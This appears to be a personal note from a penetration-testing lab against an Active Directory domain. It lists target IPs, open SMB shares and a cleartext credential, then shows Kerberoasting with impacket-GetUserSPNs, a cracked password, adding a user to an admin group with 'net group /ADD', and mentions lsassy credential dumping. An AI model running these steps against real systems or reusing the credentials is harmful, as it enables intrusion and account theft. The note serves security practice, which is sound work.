
Known IPs

> [! hint] **20.123.168.127**
> servername pastelariaOPO
> List of Shares:
> └─$ smbclient  -N -L \\\\20.123.168.127    
>
>      Sharename       Type      Comment
>        
>        ADMIN$          Disk      Remote Admin
>        C$              Disk      Default share
>        CorpScripts     Disk      
>        D$              Disk      Default share
>        IPC$            IPC       Remote IPC
 >       Users           Disk      
>
> Share CorpScripts is open and has users/passwords for SSH
>
> pastel.atum::AOlJozazuFOy2zALp0T
> a flag is in C:\user.txt 
> :D








**13.95.153.123**
server name:  adVM
 - open ports: 
	 - 445 - Commonly used for Microsoft DS ?
	 - 53 - Common for DNS
	 - 3389 . common for terminal server ?
 

**AD**
domain name -> oporissol.corp

bloodhound maps out the AD network
impacket-getuserspn gets the bolo.iogurte password hash

┌──(kali㉿lahabrea)-[~]
└─$ proxychains impacket-GetUserSPNs oporissol.corp/pastel.atum -dc-ip 10.0.0.4 -outputfile results.txt 

cracked with hashcat
sousou1235!@#%
add ourselves to server.admins

oporissol\bolo.iogurte@PASTELARIAOPO C:\Users\bolo.iogurte>net group "ServerAdmins" pastel
.atum /ADD /domain
The request will be processed at a domain controller for domain oporissol.corp.



![[Pasted image 20230603123316.png]]


crackmapexec
lsassy

![[Pasted image 20230603124147.png]]

![[Pasted image 20230603130453.png]]

sundatabase -> tool to dump all user passwords as domain controller (sumdatabase?)